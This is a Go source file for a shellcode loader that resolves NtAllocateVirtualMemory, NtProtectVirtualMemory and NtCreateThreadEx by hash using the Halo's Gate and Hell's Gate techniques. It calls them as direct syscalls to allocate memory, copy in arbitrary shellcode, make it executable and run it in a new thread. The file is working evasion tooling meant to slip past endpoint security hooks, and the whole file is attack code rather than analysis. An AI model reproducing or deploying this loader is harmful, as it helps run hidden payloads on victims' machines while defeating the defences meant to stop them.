package loader

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"syscall"
	"unsafe"
	"variant/log"
)

const (
	NAM = "NtAllocateVirtualMemory"
	NPM = "NtProtectVirtualMemory"
	NCT = "NtCreateThreadEx"
)

func HalosGate(shellcode []byte) {
	// loader
	var thisThread = uintptr(0xffffffffffffffff)

	vNtAllocateVirtualMemory, err := gabh.MemHgate(str2sha1(NAM), str2sha1)
	if err != nil {
		log.Fatal(err)
	}

	vNtProtectVirtualMemory, err := gabh.DiskHgate(Sha256Hex(NPM), Sha256Hex)
	if err != nil {
		log.Fatal(err)
	}

	vCreateThread, err := gabh.MemHgate(Sha256Hex(NCT), Sha256Hex)
	if err != nil {
		log.Fatal(err)
	}

	vWaitForSingleObject, _, err := gabh.DiskFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
	if err != nil {
		log.Fatal(err)
	}

	createThread(shellcode, thisThread, vNtAllocateVirtualMemory, vNtProtectVirtualMemory, vCreateThread, vWaitForSingleObject)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, vWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memReserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, err := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		memCommit|memReserve,
		syscall.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatalf("1 %s %x", err, r1)
	}

	memcpy(baseA, shellcode)

	var oldProtect uintptr
	r1, err = gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		log.Fatalf("1 %s %x", err, r1)
	}
	var hhosthread uintptr
	r1, err = gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(vWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if err != nil {
		log.Fatalf("1 %s %x", err, r1)
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
